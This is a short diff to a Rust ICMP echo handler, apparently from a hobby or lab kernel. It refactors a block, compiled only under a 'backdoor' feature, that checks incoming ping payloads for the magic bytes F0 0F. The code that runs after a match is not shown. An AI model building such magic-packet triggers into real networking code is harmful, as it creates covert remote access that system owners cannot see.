@@ -26,8 +26,8 @@ pub async fn handle_icmp_echo_request(
 
     #[cfg(feature = "backdoor")]
     {
-        let dpat = &icmpp.data[0..2];
         let pattern = b"\xF0\x0F";
+        let dpat = &icmpp.data[0..pattern.len()];
 
         if dpat == pattern {
             use x86_64::instructions::interrupts::without_interrupts;
